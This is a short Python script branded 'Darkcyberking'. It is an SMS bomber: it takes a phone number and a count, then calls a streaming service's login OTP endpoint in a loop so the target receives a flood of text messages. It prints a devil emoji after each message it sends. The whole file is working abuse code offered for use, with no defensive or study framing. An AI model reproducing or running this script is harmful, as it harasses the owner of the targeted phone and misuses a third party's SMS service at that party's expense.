import requests ,os
os.system("clear")



Ratul= """

+-+-+-+-+-+-+-+-+-+-+-+-+-+
|D|a|r|k|c|y|b|e|r|k|i|n|g|
+-+-+-+-+-+-+-+-+-+-+-+-+-+


"""

print(Ratul)



number=str(input(" Enter Ther number : "))
amount=int(input(" Enter SMS amount : "))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

for i in range (amount):
  requests.get(api)
  print(str(i+1)+"SMS SEND ðŸ˜ˆ")
